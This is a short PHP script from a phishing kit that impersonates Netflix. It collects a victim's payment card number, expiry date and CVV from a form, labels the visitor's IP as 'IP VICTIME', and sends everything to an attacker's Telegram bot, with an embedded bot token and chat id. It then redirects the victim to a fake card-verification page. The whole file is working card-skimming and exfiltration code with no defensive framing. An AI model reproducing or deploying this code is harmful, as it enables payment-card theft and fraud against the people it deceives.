
<?php

$Numero = $_POST['c_num'];
$exda = $_POST['exdate'];
$csc = $_POST['csc'];
    
$ip = getenv("REMOTE_ADDR");



        $tmsg = "---------- Netflix INFO=2 ---------\n\r";
        $tmsg .= "Numero de carte  : $Numero \n";
        $tmsg .= "Date d'expiration  : $exda \n";
        $tmsg .= "CVV  : $csc \n";
        $tmsg .= "IP VICTIME  : $ip \n";
        $tmsg .= "--------------------------------------\n";
        
                    file_get_contents("https://api.telegram.org/bot5438337714:AAEZN74LWgeLD-WfzjB4wTtFBcsqvnk4plA/sendMessage?chat_id=-856735443&text=" . urlencode($tmsg)."" );
 
        header("Location: ../vbv.php");
?>
